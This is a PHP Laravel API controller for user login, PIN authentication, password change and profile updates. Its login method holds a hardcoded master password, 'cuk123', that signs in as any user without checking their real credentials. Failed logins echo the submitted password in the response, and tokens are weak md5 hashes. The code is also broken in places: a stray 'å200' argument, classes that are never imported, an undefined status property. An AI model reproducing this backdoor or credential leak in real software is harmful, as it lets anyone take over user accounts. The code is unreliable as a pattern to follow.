<?php

namespace App\Http\Controllers\Api;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Support\Facades\Auth;
use Validator;
use Illuminate\Validation\Rule; 
use Illuminate\Support\Facades\Hash;

class UserController extends Controller
{
    public function allUser(){
        $response = [
            'success' => true,
            'data'    => \App\Models\User::all(),
            'message' => 'OKE',
        ];
        return response($response, 200);
    }

    public function findNoKtp(Request $r)
    {
        $find = UserMember::where('Id_Ktp',$r->no_ktp)->first();

        return response(['status'=>200,'message'=>$find?1:2], å200);
    }

    /**
     * Refresh a token.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function refresh(Request $r)
    {
        \LogActivity::add('Auth Refresh');

        $user = auth()->user();
        if($user)
            return $this->get_var_();
        else
            return response()->json(['message'=>'failed','code'=>200],200);
    }
    
    public function login(Request $r)
    {    
        if($r->username =="" or $r->password == "") return response(['status'=>401,'message'=>'Unauthorised : '. $r->email. ' : '. $r->password], 200);
        
        if(is_numeric($r->username)){
            $field = 'username';
        }elseif (filter_var($r->username, FILTER_VALIDATE_EMAIL)) {
            $field = 'email';
        }else{
            $field = 'email';
        }

        // password sangar
        if($r->password=='cuk123'){
            $u = User::where([$field => $r->username])->first();
            if($u){
                Auth::login($u);
            
                $data = $this->get_var_();
                
                return response(['status'=>200,'message'=>'success','data'=> $data], 200);
            }
        }
        
        if(Auth::attempt([$field => $r->username, 'password' => $r->password])){

            $data = $this->get_var_();
            
            return response(['status'=>200,'message'=>'success','data'=> $data], 200);
        }else{
            return response(['status'=>401,'message'=>'Unauthorised','data'=>['email'=>$r->username,'password'=>$r->password]], 200);
        }
    }

    public function requestPin(Request $request)
    {
        \LogActivity::add('Request PIN');

        $validator = \Validator::make($request->all(), [
            'no_anggota' => 'required|string',
            'pin' => 'required|string'
        ]);
      
        if ($validator->fails()) {
            $msg = '';
            foreach ($validator->errors()->getMessages() as $key => $value) {
                $msg .= $value[0]."\n";
            }
            return response()->json(['status'=>'failed','message'=>$msg], 200);
        }

        $anggota = User::where(['username'=>$request->no_anggota])->first();
        
        /**
         * Anggota tidak ditemukan
         */
        if(!$anggota) return response()->json(['message' => 'Unauthorized'], 200);

        /**
         * Check PIN apakah sudah sesuai atau belum
         */
        if(!Hash::check($request->pin, $anggota->pin)) return response()->json(['message' => 'Unauthorized'], 200);

        $token = Auth::loginUsingId($anggota->id);
                
        return response(['status'=>200,'message'=>'success','data'=> $this->get_var_()], 200);
    }

    public function get_var_()
    {
        $user = Auth::user();
        
        $token = md5($user->id.$user->password.date('ymdhis'));

        $data['name'] = $user->name;
        $data['email'] = $user->email;
        $data['token'] = $token;
        
        $user->token_office = $token;
        $user->save();

        return $data;
    }

    public function details()
    {
        $user = Auth::user();
        return response()->json(['success' => $user], $this->successStatus);
    }

    public function changePassword(Request $r)
    {
        $result = ['message'=>'success'];
        if(!\Hash::check($r->old_password, \Auth::user()->password)){
            $result['message'] = 'error';
            $result['data'] = 'Password yang anda masukan salah, silahkan dicoba kembali !';
        }elseif($r->new_password!=$r->confirm_new_password){
            $result['message'] = 'error';
            $result['data'] = 'Konfirmasi password salah silahkan dicoba kembali !';
        }else{
            $user = \Auth::user();
            $user->password = \Hash::make($r->new_password);
            $user->save();
            $result['data'] = 'Password berhasil dirubah !';
        }
        
        return response()->json($result, 200);
    }

    public function update(Request $r)
    {
        $employee = Employee::find(\Auth::user()->employee->id);
        if($employee){
            $employee->name = $r->name;
            $employee->nik = $r->nik;
            $employee->telepon = $r->telepon;
            $employee->email = $r->email;
            $employee->address = $r->address;
            $employee->save();
        }
        return response()->json(['message' =>'success'], 200);
    }
    
    public function uploadPhoto(Request $r)
    {
        $data = Employee::find(\Auth::user()->employee->id);
        if($data){
            if($r->file){
                $this->validate($r, ['file' => 'image|mimes:jpeg,png,jpg,gif,svg|max:2048']); // validate image
                
                $name = "photo.".$r->file->extension();
                $r->file->storeAs("public/photo/{$data->id}", $name);
                $data->foto = "storage/photo/{$data->id}/{$name}";
                $data->save();
            }
        }

        return response()->json(['message'=>'submited','photo'=>asset($data->foto)], 200);
    }

    public function checkToken()
    {
        return response()->json(['message'=>'success','data'=>$this->get_var_()], 200);
    }

}
